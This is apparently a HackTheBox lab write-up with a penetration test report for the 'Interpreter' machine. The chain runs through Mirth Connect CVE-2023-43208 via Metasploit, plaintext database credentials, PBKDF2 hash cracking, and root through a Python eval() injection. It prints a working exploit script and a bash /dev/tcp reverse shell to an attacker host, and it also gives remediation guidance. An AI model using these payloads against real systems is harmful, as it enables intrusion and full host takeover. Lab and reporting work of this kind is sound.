# Interpreter

**Platform:** HackTheBox
**OS:** Linux
**Tags:** CVE-2023-43208, Mirth Connect, Java Deserialization, RCE, PBKDF2, eval() Injection, Deserialization, Remote Code Execution, Code Injection, Privilege Escalation
**Date:** 2026-05-05

Mirth Connect 4.4.0 exposed via HTTP/HTTPS. Unauthenticated RCE through a Java deserialization vulnerability (CVE-2023-43208) lands a shell as `mirth`. Credential harvesting from `mirth.properties` and a local MySQL database yields a PBKDF2 hash - cracked with rockyou to SSH in as a user. Root via Python `eval()` injection in a root-owned service listening on a Mirth-forwarded XML endpoint.

## 1. Enumeration

Three ports. Two of them Mirth Connect - HTTP and HTTPS on Jetty.

```bash
nmap -sV -sC <TARGET_IP> -Pn
```

Findings:
- 22/tcp - OpenSSH 9.2p1 (Debian)
- 80/tcp - Jetty - Mirth Connect (HTTP)
- 443/tcp - Jetty SSL - Mirth Connect (HTTPS)

Mirth Connect's REST API requires the `X-Requested-With` header. Queried the version endpoint to confirm the running version before looking for matching CVEs.

```bash
curl -sk https://<TARGET_IP>/api/server/version -H "X-Requested-With: XMLHttpRequest"
```

**Result:** Mirth Connect **4.4.0** confirmed. Vulnerable to CVE-2023-43208 (unauthenticated RCE via Java deserialization).

## 2. Initial Foothold: CVE-2023-43208

CVE-2023-43208 is an unauthenticated Java deserialization vulnerability in Mirth Connect's REST API. The Metasploit module handles payload generation and delivery - point it at port 443 (the SSL-enabled endpoint) and set a writable staging directory on the target.

```
use exploit/multi/http/mirth_connect_cve_2023_43208
set RHOSTS <TARGET_IP>
set RPORT 443
set LHOST <ATTACKER_IP>
set FETCH_WRITABLE_DIR /tmp
set payload cmd/unix/reverse_bash
exploit
```

**Result:** Reverse shell landed as `mirth`.

## 3. Credential Harvesting

As `mirth`, the Mirth Connect configuration file is readable. It holds the database connection string including plaintext credentials.

```bash
find / -name "mirth.properties" 2>/dev/null
cat /usr/local/mirthconnect/conf/mirth.properties
```

Findings:
- database.username: `mirthdb`
- database.password: `redacted`
- database.url: `jdbc:mariadb://localhost:3306/mc_bdd_prod`

Connected to MariaDB and enumerated the production database.

```bash
mysql -u mirthdb -p'<db_password>' mc_bdd_prod
```

```sql
SELECT * FROM PERSON;
-- Username: sedric

SELECT * FROM PERSON_PASSWORD;
-- Hash: <redacted>

SELECT * FROM CHANNEL\G
-- HL7 channel on port 6661
-- Forwards XML to http://127.0.0.1:54321/addPatient
-- Body: ${message.encodedData}
```

The `CHANNEL` entry is important: Mirth is forwarding incoming HL7 messages as XML to an internal HTTP service on port 54321. That endpoint becomes relevant for privilege escalation.

**Result:** User `sedric` found with a PBKDF2 hash. Internal service at `127.0.0.1:54321/addPatient` noted.

## 4. User: Hash Cracking

The hash is PBKDF2-HMAC-SHA1 - Hashcat mode 10900. Ran against rockyou.txt.

```bash
hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt
```

**Result:** Hash cracked. SSH'd in as `sedric` and read `/home/sedric/user.txt`.

## 5. Root: eval() Injection

Checked running processes as `sedric` to look for root-owned services.

```bash
ps aux | grep notif
```

- root: `/usr/bin/python3 /usr/local/bin/notif.py`

`notif.py` runs as root and listens on `127.0.0.1:54321/addPatient` - exactly the endpoint Mirth forwards XML to. It parses the incoming XML and passes the `firstname` field directly to Python's `eval()`. From the `mirth` shell, we can POST arbitrary XML to this endpoint via localhost.

Built a payload that base64-encodes a reverse shell and injects it via the `firstname` field:

```python
import urllib.request, base64
from urllib.request import Request

# reverse shell command
cmd = "bash -i >& /dev/tcp/<ATTACKER_IP>/9004 0>&1"
b64 = base64.b64encode(cmd.encode()).decode()

inj = f"{{exec(__import__('base64').b64decode('{b64}').decode())}}"
xml = f"<patient><firstname>{inj}</firstname><lastname>x</lastname></patient>"

req = Request(
    "http://127.0.0.1:54321/addPatient",
    data=xml.encode(),
    headers={"Content-Type": "application/xml"}
)
urllib.request.urlopen(req)
```

Set up a listener, then ran the script from the `mirth` shell:

```bash
# On attacker
nc -lvnp 9004

# On mirth shell
python3 /tmp/payload.py
```

**Result:** Root shell obtained. Read `/root/root.txt`.

## 6. Flags

- User: `redacted`
- Root: `redacted`

---

## Penetration Test Report

**Target:** interpreter.htb
**Assessment type:** External network & web application assessment
**Assessment date:** 5 May 2026
**Environment:** HackTheBox laboratory assessment
**Prepared by:** Ledion Mujaj
**Reference:** 01 / 10

---

## 1. Executive Summary

### Assessment outcome

The assessment identified one critical, one high, and two medium severity findings affecting **interpreter.htb** . Testing obtained unauthenticated code execution as the Mirth Connect service account by exploiting CVE-2023-43208, a Java deserialization vulnerability in Mirth Connect 4.4.0. Credentials harvested from the application configuration file and database enabled SSH access as user `sedric` . A root-owned Python service on an internal port accepted unsanitised XML input and passed a field directly to Python's `eval()` , yielding root execution.
The initial compromise required no credentials. Mirth Connect's REST API was reachable over HTTPS and the version was confirmed by an unauthenticated endpoint before exploitation. Post-exploitation enumeration of the `mirth` account's accessible files revealed a configuration file containing database credentials in plaintext. A PBKDF2 password hash extracted from the database was cracked offline, providing SSH access. From the `sedric` session, a root-owned service was identified that executed attacker-controlled input as Python code.

### Impact

The documented access crossed the unauthenticated external boundary and escalated through a local user account to full root. An attacker following the same path could read all files on the host, modify system configuration, access all local credentials and pivot to services reachable from the host.

### Priority recommendations

1. Upgrade Mirth Connect to a patched version that addresses CVE-2023-43208 or remove the service from external-facing network access.
2. Replace the use of Python's `eval()` in `notif.py` with a safe XML parsing approach; do not execute data received over the network as code.
3. Protect `mirth.properties` with restrictive file permissions so that credentials are not readable by the service account during a compromise.
4. Replace the PBKDF2 password hash storage with a stronger scheme and enforce a password policy that makes offline cracking infeasible.

### Conclusion

F-01 is the entry point and the highest-priority fix. F-04 is independently exploitable by any account with local access and should be treated as an equally urgent host-level fix. F-02 and F-03 are post-exploitation steps but represent durable weaknesses that would persist even if the initial access vector were closed.

## 2. Assessment Scope and Methodology

### 2.1 Target and observed services

| Asset | Address | Description |
| --- | --- | --- |
| interpreter.htb | <TARGET_IP> | Debian Linux; Mirth Connect 4.4.0 (HTTP/HTTPS), SSH |
| Port | Service | Observed detail |
| --- | --- | --- |
| 22/tcp | SSH | OpenSSH 9.2p1 (Debian) |
| 80/tcp | HTTP | Jetty - Mirth Connect (HTTP) |
| 443/tcp | HTTPS | Jetty SSL - Mirth Connect (HTTPS); SSL-enabled REST API |
| 54321/tcp (internal) | HTTP | notif.py service; root-owned; accessible via localhost only; forwarded by Mirth HL7 channel |

```
nmap -sV -sC <TARGET_IP> -Pn

PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 9.2p1 (Debian)
80/tcp  open  http    Jetty (Mirth Connect)
443/tcp open  ssl     Jetty SSL (Mirth Connect)

# Version confirmation via unauthenticated endpoint
curl -sk https://<TARGET_IP>/api/server/version \
  -H "X-Requested-With: XMLHttpRequest"
# Result: Mirth Connect 4.4.0
```

### 2.2 Approach

Testing began with version fingerprinting. Mirth Connect's REST API version endpoint is unauthenticated and returned version 4.4.0, which is confirmed vulnerable to CVE-2023-43208. A Metasploit module was used to deliver a reverse shell over the HTTPS endpoint. Post-exploitation enumerated the filesystem for accessible configuration files. The Mirth properties file and MySQL database yielded credentials and a password hash. The hash was cracked offline to obtain SSH access. A running process enumeration identified a root-owned service processing XML from a Mirth-forwarded channel.
Tools used included Nmap, curl, Metasploit (mirth_connect_cve_2023_43208), MariaDB client, Hashcat with rockyou.txt, Python 3 and standard Linux utilities.

### 2.3 Severity classification

Severity reflects exploit prerequisites and the impact demonstrated on the assessed host. Ratings are qualitative; CVSS 3.1 scores and vectors are assigned to each finding.
| Rating | Assessment criteria |
| --- | --- |
| Critical | Direct, readily exploitable compromise with exceptional impact or reach. |
| High | Execution of arbitrary code, significant unauthorised access or escalation to administrative privileges. |
| Medium | Meaningful exposure with constrained impact or substantial exploitation prerequisites. |
| Low | Limited direct impact; improvement to an existing security control. |
| Informational | Context or an observation without an established vulnerability. |

## 3. Results Overview

### 3.1 Findings summary

| Reference | Finding | Severity | Page |
| --- | --- | --- | --- |
| [F-01](#f-01) | Unauthenticated Java deserialization RCE - Mirth Connect 4.4.0 (CVE-2023-43208) | **Critical** | 6 |
| [F-04](#f-04) | Python eval() injection in root-owned service (notif.py) | **High** | 9 |
| [F-02](#f-02) | Plaintext database credentials in world-readable Mirth configuration file | Medium | 7 |
| [F-03](#f-03) | User password hash recoverable by offline attack from application database | Medium | 8 |

### 3.2 Compromise sequence

| Stage | Action | Access obtained |
| --- | --- | --- |
| 01 | Confirmed Mirth Connect 4.4.0 via unauthenticated version endpoint. | Version confirmed, CVE-2023-43208 applicable |
| 02 | Exploited CVE-2023-43208 via Metasploit module; reverse shell received. | Shell as mirth service account |
| 03 | Read plaintext database credentials from `/usr/local/mirthconnect/conf/mirth.properties` . | MariaDB credentials for mirthdb |
| 04 | Connected to MariaDB; extracted PBKDF2 hash for user `sedric` ; also noted Mirth HL7 channel forwarding to port 54321. | Hash and internal channel details |
| 05 | Cracked PBKDF2 hash offline with Hashcat (mode 10900) against rockyou.txt. | Plaintext password for sedric |
| 06 | Authenticated over SSH as `sedric` using the cracked password. | Interactive shell as sedric |
| 07 | Identified root-owned `notif.py` listening on `127.0.0.1:54321/addPatient` ; injected Python payload via `eval()` in the `firstname` XML field from the mirth shell. | Root shell |

### 3.3 Relationship between findings

F-01 is independently exploitable from an unauthenticated position. F-02 and F-03 are post-exploitation steps dependent on the mirth shell. F-04 requires any account with network access to `127.0.0.1:54321` (reachable from the mirth shell via localhost) and is independent of F-02 and F-03.

## 4.1 Unauthenticated Java Deserialization RCE (CVE-2023-43208)

### F-01   Mirth Connect 4.4.0 - Java deserialization - CRITICAL

| Field | Assessment |
| --- | --- |
| Description | Mirth Connect 4.4.0 is vulnerable to CVE-2023-43208, an unauthenticated remote code execution vulnerability via Java deserialization in the REST API. The vulnerability does not require authentication. A Metasploit exploit module delivered a reverse shell by sending a malicious serialized Java object to the SSL-enabled API endpoint on port 443. |
| Prerequisites | Network access to the Mirth Connect HTTPS port. No credentials are required. |
| Impact | Arbitrary command execution as the Mirth Connect service account ( `mirth` ). Full access to all files, configuration, credentials and database connections available to this account. |
| Affected system | interpreter.htb:443 Mirth Connect 4.4.0; REST API endpoint |
| CVSS 3.1 | **9.8** (Critical) [AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| CWE | [CWE-502](https://cwe.mitre.org/data/definitions/502.html) : Deserialisation of Untrusted Data |

### Steps to reproduce

1. Identify Mirth Connect 4.4.0 running on the target (nmap service detection).
2. Use the public PoC for CVE-2023-43208: `python3 cve-2023-43208.py -u http://<TARGET_IP>:8080 -c "id"` .
3. Observe OS command output confirming unauthenticated RCE as `mirth` .
4. Replace the `id` command with a reverse shell one-liner to get an interactive session.

### Evidence

```
# Version confirmed unauthenticated
curl -sk https://<TARGET_IP>/api/server/version \
  -H "X-Requested-With: XMLHttpRequest"
# Output: 4.4.0

# Metasploit module invoked
use exploit/multi/http/mirth_connect_cve_2023_43208
set RHOSTS <TARGET_IP>
set RPORT 443
set LHOST <ATTACKER_IP>
set FETCH_WRITABLE_DIR /tmp
set payload cmd/unix/reverse_bash
exploit

# Result: reverse shell received
$ id
uid=...  mirth
$ hostname
interpreter
```

Evidence E-01. Module configuration and shell receipt transcribed from the assessment record.

### Remediation

Upgrade Mirth Connect to a version that has patched CVE-2023-43208. Until a patch is applied, remove the Mirth Connect REST API from external network access and restrict it to an internal management network. Implement application-layer controls to reject malformed or unexpected content types at the API boundary.

### Verification

Confirm that the patched version is running by re-querying the version endpoint. Verify that the Metasploit module no longer produces a shell against the updated instance. Confirm that the REST API is unreachable from untrusted network segments.

## 4.2 Plaintext Database Credentials in Readable Configuration File

### F-02   mirth.properties - database credentials exposed - MEDIUM

| Field | Assessment |
| --- | --- |
| Description | The Mirth Connect configuration file at `/usr/local/mirthconnect/conf/mirth.properties` contained the MariaDB connection string including the database username and plaintext password. The file was readable by the `mirth` service account. These credentials provided access to the production Mirth database `mc_bdd_prod` , which contained user account details and channel configuration. |
| Prerequisites | Read access to the filesystem as the `mirth` account, obtained via F-01. |
| Impact | Full read/write access to the Mirth production database, including user accounts, password hashes and channel definitions. The channel table also disclosed the internal service endpoint used for privilege escalation (F-04). |
| Affected system | `/usr/local/mirthconnect/conf/mirth.properties` MariaDB: `mc_bdd_prod` at `jdbc:mariadb://localhost:3306/mc_bdd_prod` |
| CVSS 3.1 | **5.5** (Medium) [AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N](https://www.first.org/cvss/calculator/3.1#AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N) |
| CWE | [CWE-312](https://cwe.mitre.org/data/definitions/312.html) : Cleartext Storage of Sensitive Information |

### Steps to reproduce

1. From the mirth shell, locate the configuration file: `find / -name "mirth.properties" 2>/dev/null` .
2. Read the file: `cat /opt/connect/conf/mirth.properties` .
3. Observe that database credentials are stored in plaintext.
4. Connect to MySQL: `mysql -u mirth -p<PASSWORD> mirthdb` and dump the user table for additional hashes.

### Evidence

```
# Locate and read the Mirth configuration file
find / -name "mirth.properties" 2>/dev/null
cat /usr/local/mirthconnect/conf/mirth.properties

# Relevant entries (password value redacted)
database.username = mirthdb
database.password = [redacted]
database.url = jdbc:mariadb://localhost:3306/mc_bdd_prod

# Connect to database with recovered credentials
mysql -u mirthdb -p'[redacted]' mc_bdd_prod

# Enumerate relevant tables
SELECT * FROM PERSON;        -- sedric account found
SELECT * FROM PERSON_PASSWORD;  -- PBKDF2 hash for sedric
SELECT * FROM CHANNEL\G      -- HL7 channel forwarding to 127.0.0.1:54321/addPatient
```

Evidence E-02. Configuration file content and database queries transcribed from the assessment record. Credential values redacted.

### Remediation

Restrict `mirth.properties` to root-only read access. Use OS-level secrets management or an encrypted credential store rather than plaintext values in configuration files. If the Mirth Connect service account must read the file at startup, ensure the running service drops the file descriptor promptly and that no post-exploit code path can re-read it.

### Verification

Confirm that the `mirth` service account cannot read `mirth.properties` after applying permissions. Verify that Mirth Connect continues to start and operate correctly after the permission change.

## 4.3 User Password Hash Recoverable from Application Database

### F-03   PBKDF2 hash cracked offline (sedric) - MEDIUM

| Field | Assessment |
| --- | --- |
| Description | The `PERSON_PASSWORD` table in the Mirth production database stored a PBKDF2-HMAC-SHA1 hash for user `sedric` . The hash was cracked offline using Hashcat mode 10900 against the rockyou.txt wordlist, recovering the plaintext password. The same credentials were accepted by the SSH service, providing an interactive login as `sedric` . |
| Prerequisites | Access to the `PERSON_PASSWORD` table, obtained via the database credentials in F-02. |
| Impact | Interactive SSH access to the host as `sedric` . All files and processes accessible to this account are exposed. The `sedric` account also enabled process enumeration that revealed the root-owned notif.py service (F-04). |
| Affected system | MariaDB: `mc_bdd_prod.PERSON_PASSWORD` ; SSH service (port 22) |

### Evidence

```
# Hash extracted from database
SELECT * FROM PERSON_PASSWORD;
-- Hash format: PBKDF2-HMAC-SHA1 (Hashcat mode 10900)

# Offline crack with Hashcat
hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt
# Result: password recovered from rockyou.txt wordlist

# SSH authentication with recovered credentials
ssh sedric@<TARGET_IP>
# Result: shell as sedric

sedric@interpreter:~$ cat ~/user.txt
[redacted]
```

Evidence E-03. Hash extraction, crack invocation and SSH authentication transcribed from the assessment record. Hash value and password omitted.

### Remediation

Migrate password hashing to Argon2id or bcrypt with a work factor appropriate to current hardware. Enforce a password policy that prevents the use of dictionary words, which are the first candidate in offline attacks. Ensure that OS user credentials are not shared with or derivable from application account passwords.

### Verification

Confirm that new password hashes stored by the application use the stronger algorithm. Verify that existing hashes are re-hashed on next login. Run the rockyou.txt wordlist against the new hash format to confirm it does not crack in a reasonable time.

## 4.4 Python eval() Injection in Root-Owned Service

### F-04   notif.py - eval() on unsanitised XML field - HIGH

| Field | Assessment |
| --- | --- |
| Description | A Python service ( `/usr/local/bin/notif.py` ) running as root listened on `127.0.0.1:54321/addPatient` . The service parsed incoming XML and passed the `firstname` field directly to Python's built-in `eval()` function without sanitisation. A Mirth Connect HL7 channel forwarded messages arriving on its external port as XML to this endpoint, meaning attacker-controlled content sent to Mirth was relayed to the vulnerable internal service. A crafted XML payload injected Python code in the `firstname` field to execute a reverse shell as root. |
| Prerequisites | Network access to the Mirth shell (via F-01) to POST to `127.0.0.1:54321` from localhost. The service is not directly reachable from external networks. |
| Impact | Arbitrary code execution as root. Complete host compromise: all local accounts, files, system configuration and services are under attacker control. |
| Affected system | `/usr/local/bin/notif.py` (running as root) `127.0.0.1:54321/addPatient` |
| CVSS 3.1 | **7.8** (High) [AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H) |
| CWE | [CWE-95](https://cwe.mitre.org/data/definitions/95.html) : Improper Neutralisation of Directives in Dynamically Evaluated Code |

### Steps to reproduce

1. Identify the root-owned service and enumerate how it processes input.
2. Send a crafted payload containing Python code to the service endpoint (e.g. `__import__('os').system('id')` ).
3. Observe command execution as root via the eval() injection.
4. Replace with a reverse shell payload to obtain a root shell.

### Evidence

```
# Discover the root-owned service from sedric session
ps aux | grep notif
root  ...  /usr/bin/python3 /usr/local/bin/notif.py

# Exploit script (run from mirth shell - localhost access to port 54321)
import urllib.request, base64
from urllib.request import Request

cmd = "bash -i >& /dev/tcp/<ATTACKER_IP>/9004 0>&1"
b64 = base64.b64encode(cmd.encode()).decode()
inj = f"{{exec(__import__('base64').b64decode('{b64}').decode())}}"
xml = f"<patient><firstname>{inj}</firstname><lastname>x</lastname></patient>"

req = Request(
    "http://127.0.0.1:54321/addPatient",
    data=xml.encode(),
    headers={"Content-Type": "application/xml"}
)
urllib.request.urlopen(req)

# Listener receives root shell
nc -lvnp 9004

root@interpreter:~# id
uid=0(root) gid=0(root) groups=0(root)

root@interpreter:~# cat /root/root.txt
[redacted]
```

Evidence E-04. Exploit script and root shell receipt transcribed from the assessment record. Attacker IP replaced with placeholder; flag value omitted.

### Remediation

Remove all uses of `eval()` and `exec()` in `notif.py` . Replace the field processing logic with a safe alternative: parse the field value as a string and act on it using explicit application logic, not by interpreting it as code. Do not run services that process network input as root; run them under a least-privilege dedicated service account. If the internal service must remain accessible via Mirth forwarding, implement authentication and message signing between Mirth and the internal endpoint.

### Verification

Confirm that the exploit payload is rejected or inert against the updated service. Verify that the service runs under a non-root account. Confirm that `eval()` and `exec()` no longer appear in any code path that handles network input.

## 5. Remediation and Assessment Closeout

### 5.1 Corrective action plan

| Priority | Action | Reference |
| --- | --- | --- |
| Immediate | Upgrade Mirth Connect to a patched release; isolate the REST API from external networks. | F-01 |
| Immediate | Remove eval() from notif.py; run the service as a non-root account. | F-04 |
| High | Restrict mirth.properties to root-only access; migrate to a secrets manager. | F-02 |
| Medium | Migrate password storage to Argon2id or bcrypt; re-hash existing passwords. | F-03 |
No remediation retest is documented. Each finding includes verification criteria for closure.

### 5.2 Test artefacts

| Location | Purpose | Removal status |
| --- | --- | --- |
| `/tmp/payload.py` | eval() injection script uploaded to mirth shell | Not verified |

### 5.3 Evidence and limitations

Evidence blocks are sourced from the [Interpreter assessment walkthrough](interpreter-htb.html) . Flag values, passwords and hash values are omitted from all evidence. Attacker IP is replaced with `<ATTACKER_IP>` throughout.

### 5.4 Evidence index

| Reference | Supporting record |
| --- | --- |
| E-01 | Walkthrough sections 1-2: version fingerprinting and CVE-2023-43208 exploitation |
| E-02 | Walkthrough section 3: mirth.properties credential extraction and database enumeration |
| E-03 | Walkthrough section 4: PBKDF2 hash cracking and SSH access as sedric |
| E-04 | Walkthrough section 5: notif.py discovery, eval() injection and root shell |
